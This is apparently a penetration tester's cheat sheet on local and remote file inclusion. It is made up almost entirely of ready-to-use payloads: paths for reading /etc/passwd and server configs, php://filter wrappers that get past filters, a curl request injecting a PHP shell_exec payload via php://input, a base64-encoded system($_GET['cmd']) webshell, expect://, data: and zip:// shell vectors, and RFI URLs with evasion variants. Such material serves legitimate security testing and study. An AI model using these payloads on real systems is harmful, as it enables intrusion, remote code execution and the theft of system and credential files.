# File Inclusion

## Local File Inclusion (LFI)

### Linux LFI Payloads

```
/etc/passwd
```

Enumerate web server configurations.

```
/etc/apache2/apache2.conf
```

### Windows LFI Payloads

```
/windows/win.ini
```

### LFI Evasion Filters

Retrieve file via base64 encoded.

```
php://filter/convert.base64-encode/resource=/remote/path/to/file

php://filter/convert.iconv.utf-8.utf-16/resource=/remote/path/to/file

$ basenc -d --base64 <<< "<base64_string>"
```

Retrieve file via base64 encoded and zlib deflated.

```
php://filter/zlib.deflate/convert.base64-encode/resource=/remote/path/to/file

$ php -r 'echo gzinflate(base64_decode(file_get_contents("php://stdin")));' <<< "<base64_string>"
```

Retrieve file via ROT13 encoded.

```
php://filter/read=string.rot13/resource=/remote/path/to/file
```

```
curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://example.com/index.php?page=php://input%00" -v

php://input&cmd=ls
```

```
expect://<os_command>
```

```
$ basenc -w 0 --base64url <<< "<?php system($_GET['cmd']); ?>"
```

```
data:text/plain;base64,<base64_encoded_payload>
```

```
zip://file.jpg%23shell.php
```

## Remote File Inclusion (RFI)

### URL Payloads

```
https://cirt.net/rfiinc.txt
https://rfi.nessus.org/rfi.txt
```

### RFI Evasion

```
HTTps://cirt.net/rfiinc.txt
https://cirt.net/rfiinc.txt?
https://cirt.net/rfiinc.txt??
https://cirt.net/rfiinc.txt?%00
```

---
## References

### Wordlist

- [PinoyWH1Z: SSH-Private-Key-Looting-Wordlists](https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists)

### Hacktricks

- [Hacktricks: PHP - Useful Functions & disable_functions/open_basedir bypass](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### PayloadsAllTheThings

- [PayloadsAllTheThings: File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)

### 0xffsec

- [0xffsec: Handbook File Inclusion and Path Traversal](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/)

- [Cobalt: A Pentester's Guide to File Inclusion](https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion)

- [Malicious.link: Simple PHP webshell with php filter chains](https://room362.com/posts/2023/simple-php-webshell-with-php-filter-chains/)

- [Certcube: Cheatsheet - LFI & RCE & Webshells](https://blog.certcube.com/detailed-cheatsheet-lfi-rce-webshells/)